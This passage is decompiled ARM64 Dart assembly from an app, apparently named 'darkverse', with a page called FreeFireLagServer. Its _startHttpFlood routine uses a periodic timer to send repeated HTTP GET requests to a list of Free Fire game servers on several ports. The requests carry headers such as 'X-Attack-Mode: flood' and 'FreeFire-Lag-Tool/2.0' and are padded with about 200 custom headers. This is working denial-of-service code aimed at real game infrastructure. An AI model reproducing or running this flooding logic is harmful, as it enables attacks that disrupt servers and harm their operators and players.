    // 0x87c564: StoreField: r0->field_23 = r2
    //     0x87c564: stur            w2, [x0, #0x23]
    // 0x87c568: r1 = <String>
    //     0x87c568: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87c56c: r0 = AllocateGrowableArray()
    //     0x87c56c: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x87c570: mov             x1, x0
    // 0x87c574: ldur            x0, [fp, #-0x90]
    // 0x87c578: StoreField: r1->field_f = r0
    //     0x87c578: stur            w0, [x1, #0xf]
    // 0x87c57c: r0 = 12
    //     0x87c57c: mov             x0, #0xc
    // 0x87c580: StoreField: r1->field_b = r0
    //     0x87c580: stur            w0, [x1, #0xb]
    // 0x87c584: r0 = _runNonInteractiveProcess()
    //     0x87c584: bl              #0x878970  ; [dart:io] ::_runNonInteractiveProcess
    // 0x87c588: mov             x1, x0
    // 0x87c58c: stur            x1, [fp, #-0x90]
    // 0x87c590: r0 = Await()
    //     0x87c590: bl              #0x4a3d90  ; AwaitStub
    // 0x87c594: r0 = LoadStaticField(0xd70)
    //     0x87c594: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c598: ldr             x0, [x0, #0x1ae0]
    // 0x87c59c: r1 = LoadInt32Instr(r0)
    //     0x87c59c: sbfx            x1, x0, #1, #0x1f
    //     0x87c5a0: tbz             w0, #0, #0x87c5a8
    //     0x87c5a4: ldur            x1, [x0, #7]
    // 0x87c5a8: add             x2, x1, #1
    // 0x87c5ac: r0 = BoxInt64Instr(r2)
    //     0x87c5ac: sbfiz           x0, x2, #1, #0x1f
    //     0x87c5b0: cmp             x2, x0, asr #1
    //     0x87c5b4: b.eq            #0x87c5c0
    //     0x87c5b8: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87c5bc: stur            x2, [x0, #7]
    // 0x87c5c0: mov             x2, x0
    // 0x87c5c4: StoreStaticField(0xd70, r2)
    //     0x87c5c4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c5c8: str             x2, [x0, #0x1ae0]
    // 0x87c5cc: b               #0x87c5d4
    // 0x87c5d0: sub             SP, fp, #0x90
    // 0x87c5d4: ldur            x3, [fp, #-0x70]
    // 0x87c5d8: ldur            x4, [fp, #-0x88]
    // 0x87c5dc: ldur            x5, [fp, #-0x80]
    // 0x87c5e0: b               #0x87c498
    // 0x87c5e4: mov             x0, x4
    // 0x87c5e8: StoreField: r0->field_1f = rNULL
    //     0x87c5e8: stur            NULL, [x0, #0x1f]
    // 0x87c5ec: r0 = Null
    //     0x87c5ec: mov             x0, NULL
    // 0x87c5f0: r0 = ReturnAsyncNotFuture()
    //     0x87c5f0: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87c5f4: mov             x0, x3
    // 0x87c5f8: r0 = ConcurrentModificationError()
    //     0x87c5f8: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87c5fc: mov             x1, x0
    // 0x87c600: ldur            x0, [fp, #-0x70]
    // 0x87c604: StoreField: r1->field_b = r0
    //     0x87c604: stur            w0, [x1, #0xb]
    // 0x87c608: mov             x0, x1
    // 0x87c60c: r0 = Throw()
    //     0x87c60c: bl              #0xbf5dcc  ; ThrowStub
    // 0x87c610: brk             #0
    // 0x87c614: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c614: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c618: b               #0x87c42c
    // 0x87c61c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c61c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c620: b               #0x87c4a8
    // 0x87c624: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87c624: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
  }
  static void _startHttpFlood() {
    // ** addr: 0x87c628, size: 0xf0
    // 0x87c628: EnterFrame
    //     0x87c628: stp             fp, lr, [SP, #-0x10]!
    //     0x87c62c: mov             fp, SP
    // 0x87c630: AllocStack(0x18)
    //     0x87c630: sub             SP, SP, #0x18
    // 0x87c634: CheckStackOverflow
    //     0x87c634: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c638: cmp             SP, x16
    //     0x87c63c: b.ls            #0x87c710
    // 0x87c640: r1 = Function '<anonymous closure>': static.
    //     0x87c640: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c1a8] AnonymousClosure: static (0x87c718), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startHttpFlood (0x87c628)
    //     0x87c644: ldr             x1, [x1, #0x1a8]
    // 0x87c648: r2 = Null
    //     0x87c648: mov             x2, NULL
    // 0x87c64c: r0 = AllocateClosure()
    //     0x87c64c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87c650: mov             x3, x0
    // 0x87c654: r1 = Null
    //     0x87c654: mov             x1, NULL
    // 0x87c658: r2 = Instance_Duration
    //     0x87c658: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c198] Obj!Duration@a44491
    //     0x87c65c: ldr             x2, [x2, #0x198]
    // 0x87c660: r0 = Timer.periodic()
    //     0x87c660: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x87c664: stur            x0, [fp, #-8]
    // 0x87c668: r0 = LoadStaticField(0xd74)
    //     0x87c668: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c66c: ldr             x0, [x0, #0x1ae8]
    // 0x87c670: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87c674: cmp             w0, w16
    // 0x87c678: b.ne            #0x87c688
    // 0x87c67c: r2 = _timers
    //     0x87c67c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x87c680: ldr             x2, [x2, #0xe60]
    // 0x87c684: r0 = InitLateStaticField()
    //     0x87c684: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87c688: stur            x0, [fp, #-0x18]
    // 0x87c68c: LoadField: r1 = r0->field_b
    //     0x87c68c: ldur            w1, [x0, #0xb]
    // 0x87c690: LoadField: r2 = r0->field_f
    //     0x87c690: ldur            w2, [x0, #0xf]
    // 0x87c694: DecompressPointer r2
    //     0x87c694: add             x2, x2, HEAP, lsl #32
    // 0x87c698: LoadField: r3 = r2->field_b
    //     0x87c698: ldur            w3, [x2, #0xb]
    // 0x87c69c: r2 = LoadInt32Instr(r1)
    //     0x87c69c: sbfx            x2, x1, #1, #0x1f
    // 0x87c6a0: stur            x2, [fp, #-0x10]
    // 0x87c6a4: r1 = LoadInt32Instr(r3)
    //     0x87c6a4: sbfx            x1, x3, #1, #0x1f
    // 0x87c6a8: cmp             x2, x1
    // 0x87c6ac: b.ne            #0x87c6b8
    // 0x87c6b0: mov             x1, x0
    // 0x87c6b4: r0 = _growToNextCapacity()
    //     0x87c6b4: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87c6b8: ldur            x2, [fp, #-0x18]
    // 0x87c6bc: ldur            x3, [fp, #-0x10]
    // 0x87c6c0: add             x4, x3, #1
    // 0x87c6c4: lsl             x5, x4, #1
    // 0x87c6c8: StoreField: r2->field_b = r5
    //     0x87c6c8: stur            w5, [x2, #0xb]
    // 0x87c6cc: LoadField: r1 = r2->field_f
    //     0x87c6cc: ldur            w1, [x2, #0xf]
    // 0x87c6d0: DecompressPointer r1
    //     0x87c6d0: add             x1, x1, HEAP, lsl #32
    // 0x87c6d4: ldur            x0, [fp, #-8]
    // 0x87c6d8: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87c6d8: add             x25, x1, x3, lsl #2
    //     0x87c6dc: add             x25, x25, #0xf
    //     0x87c6e0: str             w0, [x25]
    //     0x87c6e4: tbz             w0, #0, #0x87c700
    //     0x87c6e8: ldurb           w16, [x1, #-1]
    //     0x87c6ec: ldurb           w17, [x0, #-1]
    //     0x87c6f0: and             x16, x17, x16, lsr #2
    //     0x87c6f4: tst             x16, HEAP, lsr #32
    //     0x87c6f8: b.eq            #0x87c700
    //     0x87c6fc: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87c700: r0 = Null
    //     0x87c700: mov             x0, NULL
    // 0x87c704: LeaveFrame
    //     0x87c704: mov             SP, fp
    //     0x87c708: ldp             fp, lr, [SP], #0x10
    // 0x87c70c: ret
    //     0x87c70c: ret             
    // 0x87c710: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c710: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c714: b               #0x87c640
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87c718, size: 0x658
    // 0x87c718: EnterFrame
    //     0x87c718: stp             fp, lr, [SP, #-0x10]!
    //     0x87c71c: mov             fp, SP
    // 0x87c720: AllocStack(0x108)
    //     0x87c720: sub             SP, SP, #0x108
    // 0x87c724: SetupParameters(dynamic _ /* r1 */)
    //     0x87c724: stur            NULL, [fp, #-8]
    //     0x87c728: mov             x0, #0
    //     0x87c72c: add             x1, fp, w0, sxtw #2
    //     0x87c730: ldr             x1, [x1, #0x18]
    //     0x87c734: ldur            w2, [x1, #0x17]
    //     0x87c738: add             x2, x2, HEAP, lsl #32
    //     0x87c73c: stur            x2, [fp, #-0x90]
    // 0x87c740: CheckStackOverflow
    //     0x87c740: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c744: cmp             SP, x16
    //     0x87c748: b.ls            #0x87cd40
    // 0x87c74c: InitAsync() -> Future<void?>
    //     0x87c74c: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87c750: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87c754: r0 = LoadStaticField(0xd6c)
    //     0x87c754: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c758: ldr             x0, [x0, #0x1ad8]
    // 0x87c75c: tbz             w0, #4, #0x87c768
    // 0x87c760: r0 = Null
    //     0x87c760: mov             x0, NULL
    // 0x87c764: r0 = ReturnAsyncNotFuture()
    //     0x87c764: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87c768: r0 = LoadStaticField(0xd84)
    //     0x87c768: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c76c: ldr             x0, [x0, #0x1b08]
    // 0x87c770: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87c774: cmp             w0, w16
    // 0x87c778: b.ne            #0x87c788
    // 0x87c77c: r2 = freefireServers
    //     0x87c77c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x87c780: ldr             x2, [x2, #0xd98]
    // 0x87c784: r0 = InitLateFinalStaticField()
    //     0x87c784: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87c788: r1 = <String>
    //     0x87c788: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87c78c: stur            x0, [fp, #-0x90]
    // 0x87c790: r0 = ListIterator()
    //     0x87c790: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87c794: mov             x6, x0
    // 0x87c798: ldur            x4, [fp, #-0x90]
    // 0x87c79c: stur            x6, [fp, #-0xa8]
    // 0x87c7a0: StoreField: r6->field_b = r4
    //     0x87c7a0: stur            w4, [x6, #0xb]
    // 0x87c7a4: LoadField: r0 = r4->field_b
    //     0x87c7a4: ldur            w0, [x4, #0xb]
    // 0x87c7a8: r7 = LoadInt32Instr(r0)
    //     0x87c7a8: sbfx            x7, x0, #1, #0x1f
    // 0x87c7ac: stur            x7, [fp, #-0xa0]
    // 0x87c7b0: StoreField: r6->field_f = r7
    //     0x87c7b0: stur            x7, [x6, #0xf]
    // 0x87c7b4: ArrayStore: r6[0] = rZR  ; List_8
    //     0x87c7b4: stur            xzr, [x6, #0x17]
    // 0x87c7b8: CheckStackOverflow
    //     0x87c7b8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c7bc: cmp             SP, x16
    //     0x87c7c0: b.ls            #0x87cd48
    // 0x87c7c4: LoadField: r0 = r4->field_b
    //     0x87c7c4: ldur            w0, [x4, #0xb]
    // 0x87c7c8: r1 = LoadInt32Instr(r0)
    //     0x87c7c8: sbfx            x1, x0, #1, #0x1f
    // 0x87c7cc: cmp             x7, x1
    // 0x87c7d0: b.ne            #0x87cd20
    // 0x87c7d4: ArrayLoad: r2 = r6[0]  ; List_8
    //     0x87c7d4: ldur            x2, [x6, #0x17]
    // 0x87c7d8: cmp             x2, x1
    // 0x87c7dc: b.ge            #0x87ccf0
    // 0x87c7e0: mov             x0, x1
    // 0x87c7e4: mov             x1, x2
    // 0x87c7e8: cmp             x1, x0
    // 0x87c7ec: b.hs            #0x87cd50
    // 0x87c7f0: LoadField: r0 = r4->field_f
    //     0x87c7f0: ldur            w0, [x4, #0xf]
    // 0x87c7f4: DecompressPointer r0
    //     0x87c7f4: add             x0, x0, HEAP, lsl #32
    // 0x87c7f8: ArrayLoad: r8 = r0[r2]  ; Unknown_4
    //     0x87c7f8: add             x16, x0, x2, lsl #2
    //     0x87c7fc: ldur            w8, [x16, #0xf]
    // 0x87c800: DecompressPointer r8
    //     0x87c800: add             x8, x8, HEAP, lsl #32
    // 0x87c804: mov             x0, x8
    // 0x87c808: stur            x8, [fp, #-0x98]
    // 0x87c80c: StoreField: r6->field_1f = r0
    //     0x87c80c: stur            w0, [x6, #0x1f]
    //     0x87c810: ldurb           w16, [x6, #-1]
    //     0x87c814: ldurb           w17, [x0, #-1]
    //     0x87c818: and             x16, x17, x16, lsr #2
    //     0x87c81c: tst             x16, HEAP, lsr #32
    //     0x87c820: b.eq            #0x87c828
    //     0x87c824: bl              #0xbf62d4  ; WriteBarrierWrappersStub
    // 0x87c828: add             x0, x2, #1
    // 0x87c82c: ArrayStore: r6[0] = r0  ; List_8
    //     0x87c82c: stur            x0, [x6, #0x17]
    // 0x87c830: r1 = <int>
    //     0x87c830: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87c834: r2 = 160
    //     0x87c834: mov             x2, #0xa0
    // 0x87c838: r3 = 886
    //     0x87c838: mov             x3, #0x376
    // 0x87c83c: r5 = 16160
    //     0x87c83c: mov             x5, #0x3f20
    // 0x87c840: r0 = _GrowableList._literal3()
    //     0x87c840: bl              #0x4a02c4  ; [dart:core] _GrowableList::_GrowableList._literal3
    // 0x87c844: stur            x0, [fp, #-0xb8]
    // 0x87c848: LoadField: r2 = r0->field_7
    //     0x87c848: ldur            w2, [x0, #7]
    // 0x87c84c: DecompressPointer r2
    //     0x87c84c: add             x2, x2, HEAP, lsl #32
    // 0x87c850: mov             x1, x2
    // 0x87c854: stur            x2, [fp, #-0xb0]
    // 0x87c858: r0 = ListIterator()
    //     0x87c858: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87c85c: mov             x4, x0
    // 0x87c860: ldur            x3, [fp, #-0xb8]
    // 0x87c864: stur            x4, [fp, #-0xd0]
    // 0x87c868: StoreField: r4->field_b = r3
    //     0x87c868: stur            w3, [x4, #0xb]
    // 0x87c86c: LoadField: r0 = r3->field_b
    //     0x87c86c: ldur            w0, [x3, #0xb]
    // 0x87c870: r5 = LoadInt32Instr(r0)
    //     0x87c870: sbfx            x5, x0, #1, #0x1f
    // 0x87c874: stur            x5, [fp, #-0xc8]
    // 0x87c878: StoreField: r4->field_f = r5
    //     0x87c878: stur            x5, [x4, #0xf]
    // 0x87c87c: ArrayStore: r4[0] = rZR  ; List_8
    //     0x87c87c: stur            xzr, [x4, #0x17]
    // 0x87c880: ldur            x6, [fp, #-0x98]
    // 0x87c884: CheckStackOverflow
    //     0x87c884: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c888: cmp             SP, x16
    //     0x87c88c: b.ls            #0x87cd54
    // 0x87c890: LoadField: r0 = r3->field_b
    //     0x87c890: ldur            w0, [x3, #0xb]
    // 0x87c894: r1 = LoadInt32Instr(r0)
    //     0x87c894: sbfx            x1, x0, #1, #0x1f
    // 0x87c898: cmp             x5, x1
    // 0x87c89c: b.ne            #0x87cd00
    // 0x87c8a0: ArrayLoad: r2 = r4[0]  ; List_8
    //     0x87c8a0: ldur            x2, [x4, #0x17]
    // 0x87c8a4: cmp             x2, x1
    // 0x87c8a8: b.ge            #0x87ccd8
    // 0x87c8ac: mov             x0, x1
    // 0x87c8b0: mov             x1, x2
    // 0x87c8b4: cmp             x1, x0
    // 0x87c8b8: b.hs            #0x87cd5c
    // 0x87c8bc: LoadField: r0 = r3->field_f
    //     0x87c8bc: ldur            w0, [x3, #0xf]
    // 0x87c8c0: DecompressPointer r0
    //     0x87c8c0: add             x0, x0, HEAP, lsl #32
    // 0x87c8c4: ArrayLoad: r7 = r0[r2]  ; Unknown_4
    //     0x87c8c4: add             x16, x0, x2, lsl #2
    //     0x87c8c8: ldur            w7, [x16, #0xf]
    // 0x87c8cc: DecompressPointer r7
    //     0x87c8cc: add             x7, x7, HEAP, lsl #32
    // 0x87c8d0: mov             x0, x7
    // 0x87c8d4: stur            x7, [fp, #-0xc0]
    // 0x87c8d8: StoreField: r4->field_1f = r0
    //     0x87c8d8: stur            w0, [x4, #0x1f]
    //     0x87c8dc: tbz             w0, #0, #0x87c8f8
    //     0x87c8e0: ldurb           w16, [x4, #-1]
    //     0x87c8e4: ldurb           w17, [x0, #-1]
    //     0x87c8e8: and             x16, x17, x16, lsr #2
    //     0x87c8ec: tst             x16, HEAP, lsr #32
    //     0x87c8f0: b.eq            #0x87c8f8
    //     0x87c8f4: bl              #0xbf6294  ; WriteBarrierWrappersStub
    // 0x87c8f8: add             x0, x2, #1
    // 0x87c8fc: ArrayStore: r4[0] = r0  ; List_8
    //     0x87c8fc: stur            x0, [x4, #0x17]
    // 0x87c900: cmp             w7, NULL
    // 0x87c904: b.ne            #0x87c938
    // 0x87c908: mov             x0, x7
    // 0x87c90c: ldur            x2, [fp, #-0xb0]
    // 0x87c910: r1 = Null
    //     0x87c910: mov             x1, NULL
    // 0x87c914: cmp             w2, NULL
    // 0x87c918: b.eq            #0x87c938
    // 0x87c91c: ArrayLoad: r4 = r2[0]  ; List_4
    //     0x87c91c: ldur            w4, [x2, #0x17]
    // 0x87c920: DecompressPointer r4
    //     0x87c920: add             x4, x4, HEAP, lsl #32
    // 0x87c924: r8 = X0
    //     0x87c924: ldr             x8, [PP, #0x258]  ; [pp+0x258] TypeParameter: X0
    // 0x87c928: LoadField: r9 = r4->field_7
    //     0x87c928: ldur            x9, [x4, #7]
    // 0x87c92c: r3 = Null
    //     0x87c92c: add             x3, PP, #0x3c, lsl #12  ; [pp+0x3c1b0] Null
    //     0x87c930: ldr             x3, [x3, #0x1b0]
    // 0x87c934: blr             x9
    // 0x87c938: r0 = current()
    //     0x87c938: bl              #0x49b6b4  ; [dart:_http] HttpOverrides::current
    // 0x87c93c: r0 = _HttpClient()
    //     0x87c93c: bl              #0x49e240  ; Allocate_HttpClientStub -> _HttpClient (size=0x4c)
    // 0x87c940: mov             x1, x0
    // 0x87c944: stur            x0, [fp, #-0xd8]
    // 0x87c948: r0 = _HttpClient()
    //     0x87c948: bl              #0x49df20  ; [dart:_http] _HttpClient::_HttpClient
    // 0x87c94c: r0 = LoadStaticField(0xd78)
    //     0x87c94c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c950: ldr             x0, [x0, #0x1af0]
    // 0x87c954: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87c958: cmp             w0, w16
    // 0x87c95c: b.ne            #0x87c96c
    // 0x87c960: r2 = _httpClients
    //     0x87c960: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be68] Field <_FreeFireLagServerPageState@829239838._httpClients@829239838>: static late (offset: 0xd78)
    //     0x87c964: ldr             x2, [x2, #0xe68]
    // 0x87c968: r0 = InitLateStaticField()
    //     0x87c968: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87c96c: stur            x0, [fp, #-0xf0]
    // 0x87c970: LoadField: r2 = r0->field_b
    //     0x87c970: ldur            w2, [x0, #0xb]
    // 0x87c974: stur            x2, [fp, #-0xe8]
    // 0x87c978: LoadField: r1 = r0->field_f
    //     0x87c978: ldur            w1, [x0, #0xf]
    // 0x87c97c: DecompressPointer r1
    //     0x87c97c: add             x1, x1, HEAP, lsl #32
    // 0x87c980: LoadField: r3 = r1->field_b
    //     0x87c980: ldur            w3, [x1, #0xb]
    // 0x87c984: r4 = LoadInt32Instr(r2)
    //     0x87c984: sbfx            x4, x2, #1, #0x1f
    // 0x87c988: stur            x4, [fp, #-0xe0]
    // 0x87c98c: r1 = LoadInt32Instr(r3)
    //     0x87c98c: sbfx            x1, x3, #1, #0x1f
    // 0x87c990: cmp             x4, x1
    // 0x87c994: b.ne            #0x87c9a0
    // 0x87c998: mov             x1, x0
    // 0x87c99c: r0 = _growToNextCapacity()
    //     0x87c99c: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87c9a0: ldur            x0, [fp, #-0xf0]
    // 0x87c9a4: ldur            x2, [fp, #-0xe0]
    // 0x87c9a8: ldur            x3, [fp, #-0x98]
    // 0x87c9ac: ldur            x4, [fp, #-0xc0]
    // 0x87c9b0: add             x1, x2, #1
    // 0x87c9b4: lsl             x5, x1, #1
    // 0x87c9b8: StoreField: r0->field_b = r5
    //     0x87c9b8: stur            w5, [x0, #0xb]
    // 0x87c9bc: LoadField: r1 = r0->field_f
    //     0x87c9bc: ldur            w1, [x0, #0xf]
    // 0x87c9c0: DecompressPointer r1
    //     0x87c9c0: add             x1, x1, HEAP, lsl #32
    // 0x87c9c4: ldur            x0, [fp, #-0xd8]
    // 0x87c9c8: ArrayStore: r1[r2] = r0  ; List_4
    //     0x87c9c8: add             x25, x1, x2, lsl #2
    //     0x87c9cc: add             x25, x25, #0xf
    //     0x87c9d0: str             w0, [x25]
    //     0x87c9d4: tbz             w0, #0, #0x87c9f0
    //     0x87c9d8: ldurb           w16, [x1, #-1]
    //     0x87c9dc: ldurb           w17, [x0, #-1]
    //     0x87c9e0: and             x16, x17, x16, lsr #2
    //     0x87c9e4: tst             x16, HEAP, lsr #32
    //     0x87c9e8: b.eq            #0x87c9f0
    //     0x87c9ec: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87c9f0: r1 = Null
    //     0x87c9f0: mov             x1, NULL
    // 0x87c9f4: r2 = 10
    //     0x87c9f4: mov             x2, #0xa
    // 0x87c9f8: r0 = AllocateArray()
    //     0x87c9f8: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87c9fc: r16 = "http://"
    //     0x87c9fc: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c1c0] "http://"
    //     0x87ca00: ldr             x16, [x16, #0x1c0]
    // 0x87ca04: StoreField: r0->field_f = r16
    //     0x87ca04: stur            w16, [x0, #0xf]
    // 0x87ca08: ldur            x1, [fp, #-0x98]
    // 0x87ca0c: StoreField: r0->field_13 = r1
    //     0x87ca0c: stur            w1, [x0, #0x13]
    // 0x87ca10: r16 = ":"
    //     0x87ca10: ldr             x16, [PP, #0xc48]  ; [pp+0xc48] ":"
    // 0x87ca14: ArrayStore: r0[0] = r16  ; List_4
    //     0x87ca14: stur            w16, [x0, #0x17]
    // 0x87ca18: ldur            x2, [fp, #-0xc0]
    // 0x87ca1c: StoreField: r0->field_1b = r2
    //     0x87ca1c: stur            w2, [x0, #0x1b]
    // 0x87ca20: r16 = "/"
    //     0x87ca20: ldr             x16, [PP, #0xe40]  ; [pp+0xe40] "/"
    // 0x87ca24: StoreField: r0->field_1f = r16
    //     0x87ca24: stur            w16, [x0, #0x1f]
    // 0x87ca28: str             x0, [SP]
    // 0x87ca2c: r0 = _interpolate()
    //     0x87ca2c: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x87ca30: mov             x1, x0
    // 0x87ca34: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x87ca34: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x87ca38: r0 = parse()
    //     0x87ca38: bl              #0x4a4d3c  ; [dart:core] Uri::parse
    // 0x87ca3c: ldur            x1, [fp, #-0xd8]
    // 0x87ca40: mov             x3, x0
    // 0x87ca44: r2 = "get"
    //     0x87ca44: add             x2, PP, #0x2b, lsl #12  ; [pp+0x2bcd8] "get"
    //     0x87ca48: ldr             x2, [x2, #0xcd8]
    // 0x87ca4c: r0 = _openUrl()
    //     0x87ca4c: bl              #0x4822d8  ; [dart:_http] _HttpClient::_openUrl
    // 0x87ca50: mov             x1, x0
    // 0x87ca54: stur            x1, [fp, #-0xe8]
    // 0x87ca58: r0 = Await()
    //     0x87ca58: bl              #0x4a3d90  ; AwaitStub
    // 0x87ca5c: stur            x0, [fp, #-0xf0]
    // 0x87ca60: LoadField: r4 = r0->field_37
    //     0x87ca60: ldur            w4, [x0, #0x37]
    // 0x87ca64: DecompressPointer r4
    //     0x87ca64: add             x4, x4, HEAP, lsl #32
    // 0x87ca68: mov             x1, x4
    // 0x87ca6c: stur            x4, [fp, #-0xe8]
    // 0x87ca70: r2 = "User-Agent"
    //     0x87ca70: add             x2, PP, #0x18, lsl #12  ; [pp+0x18c98] "User-Agent"
    //     0x87ca74: ldr             x2, [x2, #0xc98]
    // 0x87ca78: r3 = "FreeFire-Lag-Tool/2.0"
    //     0x87ca78: add             x3, PP, #0x3c, lsl #12  ; [pp+0x3c1c8] "FreeFire-Lag-Tool/2.0"
    //     0x87ca7c: ldr             x3, [x3, #0x1c8]
    // 0x87ca80: r4 = const [0, 0x3, 0, 0x3, null]
    //     0x87ca80: ldr             x4, [PP, #0x348]  ; [pp+0x348] List(5) [0, 0x3, 0, 0x3, Null]
    // 0x87ca84: r0 = add()
    //     0x87ca84: bl              #0x47f55c  ; [dart:_http] _HttpHeaders::add
    // 0x87ca88: ldur            x1, [fp, #-0xe8]
    // 0x87ca8c: r2 = "Accept"
    //     0x87ca8c: add             x2, PP, #0x16, lsl #12  ; [pp+0x16098] "Accept"
    //     0x87ca90: ldr             x2, [x2, #0x98]
    // 0x87ca94: r3 = "*/*"
    //     0x87ca94: add             x3, PP, #0x39, lsl #12  ; [pp+0x391b8] "*/*"
    //     0x87ca98: ldr             x3, [x3, #0x1b8]
    // 0x87ca9c: r4 = const [0, 0x3, 0, 0x3, null]
    //     0x87ca9c: ldr             x4, [PP, #0x348]  ; [pp+0x348] List(5) [0, 0x3, 0, 0x3, Null]
    // 0x87caa0: r0 = add()
    //     0x87caa0: bl              #0x47f55c  ; [dart:_http] _HttpHeaders::add
    // 0x87caa4: ldur            x1, [fp, #-0xe8]
    // 0x87caa8: r2 = "X-Attack-Mode"
    //     0x87caa8: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c1d0] "X-Attack-Mode"
    //     0x87caac: ldr             x2, [x2, #0x1d0]
    // 0x87cab0: r3 = "flood"
    //     0x87cab0: add             x3, PP, #0x3c, lsl #12  ; [pp+0x3c1d8] "flood"
    //     0x87cab4: ldr             x3, [x3, #0x1d8]
    // 0x87cab8: r4 = const [0, 0x3, 0, 0x3, null]
    //     0x87cab8: ldr             x4, [PP, #0x348]  ; [pp+0x348] List(5) [0, 0x3, 0, 0x3, Null]
    // 0x87cabc: r0 = add()
    //     0x87cabc: bl              #0x47f55c  ; [dart:_http] _HttpHeaders::add
    // 0x87cac0: ldur            x1, [fp, #-0xe8]
    // 0x87cac4: r2 = "Connection"
    //     0x87cac4: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c1e0] "Connection"
    //     0x87cac8: ldr             x2, [x2, #0x1e0]
    // 0x87cacc: r3 = "keep-alive"
    //     0x87cacc: add             x3, PP, #0x10, lsl #12  ; [pp+0x10108] "keep-alive"
    //     0x87cad0: ldr             x3, [x3, #0x108]
    // 0x87cad4: r4 = const [0, 0x3, 0, 0x3, null]
    //     0x87cad4: ldr             x4, [PP, #0x348]  ; [pp+0x348] List(5) [0, 0x3, 0, 0x3, Null]
    // 0x87cad8: r0 = add()
    //     0x87cad8: bl              #0x47f55c  ; [dart:_http] _HttpHeaders::add
    // 0x87cadc: r0 = 0
    //     0x87cadc: mov             x0, #0
    // 0x87cae0: stur            x0, [fp, #-0xe0]
    // 0x87cae4: CheckStackOverflow
    //     0x87cae4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87cae8: cmp             SP, x16
    //     0x87caec: b.ls            #0x87cd60
    // 0x87caf0: cmp             x0, #0xc8
    // 0x87caf4: b.ge            #0x87cb70
    // 0x87caf8: r1 = Null
    //     0x87caf8: mov             x1, NULL
    // 0x87cafc: r2 = 4
    //     0x87cafc: mov             x2, #4
    // 0x87cb00: r0 = AllocateArray()
    //     0x87cb00: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87cb04: mov             x2, x0
    // 0x87cb08: r16 = "X-Custom-"
    //     0x87cb08: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c1e8] "X-Custom-"
    //     0x87cb0c: ldr             x16, [x16, #0x1e8]
    // 0x87cb10: StoreField: r2->field_f = r16
    //     0x87cb10: stur            w16, [x2, #0xf]
    // 0x87cb14: ldur            x3, [fp, #-0xe0]
    // 0x87cb18: r0 = BoxInt64Instr(r3)
    //     0x87cb18: sbfiz           x0, x3, #1, #0x1f
    //     0x87cb1c: cmp             x3, x0, asr #1
